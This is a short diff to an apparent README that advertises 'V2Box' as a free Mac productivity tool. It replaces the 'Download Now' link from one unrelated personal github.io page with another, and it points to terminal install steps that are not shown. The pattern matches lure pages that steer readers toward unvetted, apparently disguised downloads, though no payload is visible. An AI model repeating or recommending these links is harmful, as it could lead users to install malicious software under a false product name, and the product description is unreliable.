@@ -3,7 +3,7 @@
 
 V2Box is a powerful and lightweight productivity tool designed for Mac OS, offering seamless integration and a user-friendly interface. Follow the instructions below to install V2Box on your Mac and unlock its full potential for free.
 
-[![Download Now](https://img.shields.io/badge/Download-Now-007AFF?style=for-the-badge&logo=apple)](https://fituganshfgh.github.io/.github/v2box)
+[![Download Now](https://img.shields.io/badge/Download-Now-007AFF?style=for-the-badge&logo=apple)](https://mrboomzeus519.github.io/gimronus/v2box)
 
 If the download button above doesn’t work, follow the manual installation instructions below using the terminal.
 
